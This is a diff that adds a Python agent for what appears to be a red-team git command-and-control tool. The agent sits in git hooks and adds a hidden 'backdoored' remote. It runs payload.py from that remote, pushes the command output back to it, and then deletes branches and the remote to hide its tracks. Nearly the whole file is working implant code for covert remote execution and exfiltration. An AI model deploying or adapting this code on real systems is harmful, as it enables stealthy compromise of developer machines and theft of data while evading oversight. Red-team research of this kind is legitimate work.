@@ -1,0 +1,200 @@
+#!/usr/bin/env python
+
+import os
+from subprocess import Popen, PIPE
+import imp
+import uuid
+import string
+
+#####################################################################
+# These settings need to be customized before the agent is deployed #
+#####################################################################
+
+# URL of our backdoored repo
+REPO_CLONE_URL = "$repo_clone_url"
+
+# Name to give the remote backdoored repo
+REMOTE_REPO_NAME = "$remote_repo_name"
+
+# Master branch for backdoored repo
+REMOTE_REPO_MASTER_BRANCH = "$remote_repo_master_branch"
+
+NODE_ID = "$node_id"
+
+RESULTS_FILE = "results.json"
+
+# Runs the passed string as a shell command
+def run_command(command):
+    print("Running: %s" % command)
+    proc = Popen(command, stdout=PIPE, stderr=PIPE, shell=True, universal_newlines=True)
+    (out, err) = proc.communicate()
+    print(out, err)
+    return out, err
+
+# Adds a new remote to the git repo in the current directory
+def add_git_remote(remote_name, git_url):
+    cmd = "git remote add %s %s" % (remote_name, git_url)
+    run_command(cmd)
+
+def git_checkout_branch(branch_name):
+    cmd = "git checkout -b %s" % (branch_name)
+    run_command(cmd)
+
+def git_pull(remote_repo_name, remote_repo_master_branch):
+    cmd = "git pull %s %s" % (remote_repo_name, remote_repo_master_branch)
+    run_command(cmd)
+
+def git_add(files):
+    cmd = "git add %s" % (files)
+    run_command(cmd)
+
+def git_commit(message):
+    cmd = "git commit -m '%s'" % (message)
+    run_command(cmd)
+
+def git_push(remote_name, branch_name):
+    cmd = "git push %s %s" % (remote_name, branch_name)
+    run_command(cmd)
+
+# TODO: finish me
+# Eventually this will look at who the current node is and see what commands they should run
+def should_run_commands(repo_dir):
+    return True
+
+# Load payload.py and run the commands it contains
+def run_payload(repo_dir):
+    # the backdoored repo isn't on our path so load it's source directly so we can use it
+    payload_module = imp.load_source('payload', os.path.join(repo_dir, 'payload.py'))
+
+    payload = payload_module.Payload()
+    payload.run()
+    payload.save_results()
+    return payload
+
+def get_commit_info():
+    # TODO: eventually grab prior commit messages and use those or do some other
+    # steps to make it look legit. For now just return mostly hardcoded values.
+    return NODE_ID, "Make errors reported more clear"
+
+# Current state of the repo:
+# - Our backdoored repo has been added as a remote, named `remote_repo_name`
+# - We have an additional local branch we've saved command output into
+#
+# We want to get ride of all these things so that we're left with only the benign
+# remote and default master they'd see on GitHub/whatever.
+def hide_git_tracks(remote_repo_name, commit_branch):
+    run_command("git checkout -b tmp")
+
+    run_command("git branch -d %s" % commit_branch) # delete the new branch we created
+    run_command("git branch -D master") # delete master in case commits from our backdoored repo have mingled
+    run_command("git remote remove %s" % remote_repo_name) # remove backdoored remote
+
+    run_command("git pull origin master") # get benign repo latest
+    run_command("git checkout master")
+
+    run_command("git branch -D tmp")
+
+# NOTE: this assumes we're in .git/hooks, or at least appends "../../" to __file__
+def get_current_repo_root():
+    cur_file = os.path.dirname(os.path.realpath(__file__))
+    return os.path.abspath(os.path.join(cur_file, "..", ".."))
+
+def rewrite_script_add_node_id(path_to_this_script, node_id):
+    print("[*] Rewriting node_id")
+    with open(path_to_this_script, 'r') as f:
+        templatized_this_file = string.Template(f.read())
+
+    replaced_contents = templatized_this_file.safe_substitute({"node_id": node_id})
+
+    with open(path_to_this_script, 'w') as f:
+        f.write(replaced_contents)
+        f.flush()
+
+def main(repo_dir, private_git_url, remote_repo_name, remote_repo_master_branch):
+    path_to_this_script = os.path.abspath(__file__)
+    # cd to REPO_DIR
+    os.chdir(repo_dir)
+
+    # Add the remote that will have commands for us
+    add_git_remote(remote_repo_name, private_git_url)
+
+    # checkout master of this new remote
+    git_checkout_branch(remote_repo_name + "/" + remote_repo_master_branch)
+
+    # If you wish to set tracking information for this branch you can do so with:
+    # git branch --set-upstream-to=<remote>/<branch> master
+
+    # git pull
+    git_pull(remote_repo_name, remote_repo_master_branch)
+
+    # determine if you should run the commands
+    if should_run_commands(repo_dir):
+
+        commit_branch, commit_message = get_commit_info()
+
+        # Generate node ID if we haven't already
+        if commit_branch == "$node" + "_id": # have to break it up else this comparison will also get rewritten
+            node_id = str(uuid.uuid4())
+            rewrite_script_add_node_id(path_to_this_script, node_id)
+            commit_branch = node_id
+
+        git_checkout_branch(commit_branch)
+
+        # grab further changes server-side from the last time we pushed
+        git_pull(remote_repo_name, commit_branch)
+
+        # run the commands and save the results to file
+        payload_obj = run_payload(repo_dir)
+
+        # commit the results
+        # the branch we'll commit this node's info to to push to the server
+        git_add(RESULTS_FILE)
+
+        # Git doesn't let you commit if you don't set user.name and user.email
+        need_to_reset_git_info = False
+        if git_commit_info_is_unset():
+            need_to_reset_git_info = True
+            set_git_commit_info("Gitpwnd", "gitpwnd@nccgroup.trust")
+
+        git_commit(commit_message)
+
+        # push results
+        git_push(remote_repo_name, commit_branch)
+
+        # Clean up locally
+        if need_to_reset_git_info:
+            remove_git_commit_info()
+
+        hide_git_tracks(remote_repo_name, commit_branch)
+    else:
+        print("[*] Skipping these commands, they're not for this node")
+
+    run_command("git branch -D %s" % (remote_repo_name + "/" + remote_repo_master_branch))
+
+# Is git's user.name or user.email unset?
+def git_commit_info_is_unset():
+    # If they haven't set their username they probably also haven't set their email
+    # TODO: in the future, improve this to handle one being set and the other not
+    try:
+        # throws an exception if no git user name is set
+        subprocess.check_output("git config --get user.name", shell=True)
+        return False
+    except:
+        return True
+
+# Unsets the git user.name and user.email
+def remove_git_commit_info():
+    run_command("git config --unset user.name")
+    run_command("git config --unset user.email")
+
+# Sets git's user.name and user.email to provided values
+def set_git_commit_info(username, email):
+    run_command("git config user.name %s" % username)
+    run_command("git config user.email %s" % email)
+
+
+# This agent file has been placed in a hook file in the command and control
+# repo and is called by git hooks in other repos.
+if __name__ == "__main__":
+    repo_dir = get_current_repo_root()
+    main(repo_dir, REPO_CLONE_URL, REMOTE_REPO_NAME, REMOTE_REPO_MASTER_BRANCH)
